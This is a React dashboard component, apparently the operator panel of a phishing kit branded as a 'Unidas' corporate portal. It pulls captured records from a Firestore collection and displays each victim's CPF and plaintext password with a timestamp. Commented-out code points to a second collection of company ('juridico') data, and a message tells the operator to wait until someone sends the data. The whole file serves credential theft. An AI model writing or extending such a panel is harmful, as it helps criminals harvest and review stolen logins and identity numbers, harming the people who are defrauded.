import React, { useState, useEffect, useContext } from "react";
import { db } from "../../services/firebaseConnection";
import { collection, getDocs, orderBy, query } from "firebase/firestore";
import { Helmet } from "react-helmet";
import { Container, Wrapper } from "./styles";
import { Context } from "../../context";
// import { auth } from "../../services/firebaseConnection";

import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { Row, Col } from "react-bootstrap";

export default function Dashboard() {
  const [meusDados, setMeusDados] = useState([]);
  // const [meusDados2, setMeusDados2] = useState([]);
  //const [dadosJuridico, setDadosJuridico] = useState([]);

  const { logOut } = useContext(Context);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const dadosRef = collection(db, "dados");
        const queryDados = query(dadosRef, orderBy("created", "desc"));
        const docSnap = await getDocs(queryDados);
        const array = docSnap.docs.map((i) => {
          return i.data();
        });
        setMeusDados(array);

        /*
        const dadosJuridicoRef = collection(db, "dadosJuridico");
        const queryDadosJuridico = query(
          dadosJuridicoRef,
          orderBy("created", "desc")
        );
        const docSnapJuridico = await getDocs(queryDadosJuridico);
        const arrayJuridico = docSnapJuridico.docs.map((i) => {
          return i.data();
        });
        setDadosJuridico(arrayJuridico);
        */
      } catch (error) {
        console.log(error);
      }
    };

    fetchData();
  }, []);

  async function deslogar() {
    await logOut();
  }

  return (
    <Wrapper>
      <Helmet>
        <meta charSet="utf-8" />
        <title>Painel - Unidas | Portal Corporativo</title>
      </Helmet>
      <ToastContainer
        position="top-right"
        autoClose={2000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="light"
      />

      {/* <NavBarDashboard /> */}

      <Container>
        {/* <header>
        <h2 className='titulo-dashboard'>Dashboard</h2>
       
      </header> */}

        <div
          style={{
            width: "100%",
            height: 60,
            backgroundColor: "#12335f",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
          }}
        >
          <button
            onClick={deslogar}
            className="btnDesconectar"
            style={{
              border: "none",
              height: 30,
              padding: 6,
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
            }}
          >
            Desconectar!
          </button>
        </div>

        {meusDados ? (
          <Row style={{ padding: 20, width: "100%" }}>
            <Col md={6} sm={12} style={{ marginBottom: 50 }}>
              <h3>Dados físico</h3>

              <div
                style={{ marginTop: 40, overflow: "auto", maxHeight: "90vh" }}
              >
                {/* dadosAgenciaContaSenha */}
                {meusDados.map((data) => (
                  <div
                    key={data.id}
                    className="boxDados"
                    style={{ borderBottom: "1px solid #000" }}
                  >
                    <p>CPF: {data.cpf}</p>
                    <p>Senha: {data.password}</p>
                    <p>
                      Data: {new Date(data.created).toLocaleString("pt-BR")}
                    </p>
                  </div>
                ))}
              </div>
            </Col>
          </Row>
        ) : (
          <div className="divInformacoes">
            <h2>Bem-vindo(a),</h2>
            <br />
            <p>Por favor, aguarde até alguém enviar os dados!</p>
          </div>
        )}
      </Container>
    </Wrapper>
  );
}
